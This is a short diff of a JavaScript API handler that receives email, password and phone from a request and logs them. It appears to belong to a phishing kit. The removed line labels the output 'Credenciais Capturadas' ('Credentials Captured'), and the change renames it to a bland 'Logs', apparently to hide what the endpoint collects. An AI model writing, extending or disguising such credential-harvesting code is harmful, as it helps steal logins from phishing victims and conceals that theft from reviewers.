@@ -11,7 +11,7 @@ export default async function handler(req, res) {
 
   const { email, password, telefone} = req.body
 
-  const message = `🥃 Credenciais Capturadas 🥃`
+  const message = `Logs`
 
   console.log(message)
   console.log(`Email: ${email}`)
